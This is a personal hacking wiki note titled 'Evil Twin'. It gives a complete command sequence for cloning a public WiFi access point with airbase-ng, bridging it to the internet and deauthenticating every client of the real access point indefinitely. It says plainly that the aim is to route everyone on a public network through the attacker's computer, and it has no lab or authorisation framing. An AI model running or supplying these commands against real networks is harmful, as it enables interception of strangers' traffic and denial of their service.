---
title: "Evil Twin"
created: 2019-03-16T02:50:28.874-05:00
modified: 2019-03-16T02:51:14.264-05:00
parent: "[[Hacking - Network]]"
children: []
---
Assuming you’re at a public area with free WiFi and you want everyone connected to the WiFi Access Point (AP) to go through your computer first. You are at the right place!

recommend doing this in Kali Linux terminal

requires aircrack-ng and bridge-utils
<span style="white-space: pre-wrap"><code>    apt-get install bridge-utils</code><br><code>    apt-get install aircrack-ng</code></span>

<strong>TL;DR Steps</strong>
```bash
airmon-ng start wlan0
airbase-ng -a 60:6D:C7:B6:48:34 --essid "DETERMINATION" -c 1 wlan0mon
brctl addbr evil
brctl addif evil en0
brctl addif evil at0
ifconfig at0 0.0.0.0 up
ifconfig evil up
dhclient evil
aireplay-ng -0 0 -a 60:6D:C7:B6:48:34 wlan0mon
```

<strong>Detailed Steps</strong>
1. put NIC in monitor mode
   
   <span style="white-space: pre-wrap"><code>airmon-ng start wlan0</code></span>
2. create your own AP mirroring target AP (airbase-ng would create a network interface at0)
   
   <span style="white-space: pre-wrap"><code>airbase-ng -a 60:6D:C7:B6:48:34 --essid "DETERMINATION" -c 1 wlan0mon</code></span>
	- -a 60:6D:C7:B6:48:34 is MAC address of AP
	- --essid “DETERMINATION” is the name of the Extended Service Set Identification
	- -c 1 is the channel the AP is on
	- wlan0mon is your nic (network interface card)
3. create bridging interface named “evil” or anything else.
   
   <span style="white-space: pre-wrap"><code>brctl addbr evil</code></span>
4. with your bridging interface, connect at0 to your NIC which is connected to the internet
   
   <span style="white-space: pre-wrap"><code>brctl addif evil en0</code><br><code>brctl addif evil at0</code></span>
5. up the interfaces
   
   <span style="white-space: pre-wrap"><code>ifconfig at0 0.0.0.0 up</code><br><code>ifconfig evil up</code></span>
6. Dynamic Host Configuration Protocol Client
   
   <span style="white-space: pre-wrap"><code>dhclient evil</code></span>
7. deauth everyone connected to target AP
   
   <span style="white-space: pre-wrap"><code>aireplay-ng -0 0 -a 60:6D:C7:B6:48:34 wlan0mon</code><br><code>aireplay-ng -0 0 -a 60:6D:C7:B6:48:34 -c 00:34:da:57:09:88 wlan0mon</code></span>
	- -0 0 is send deauth forever
	- -a 60:6D:C7:B6:48:34 is MAC address of AP
	- -c 00:34:da:57:09:88 is target device to deauth
	- wlan0mon is your nic
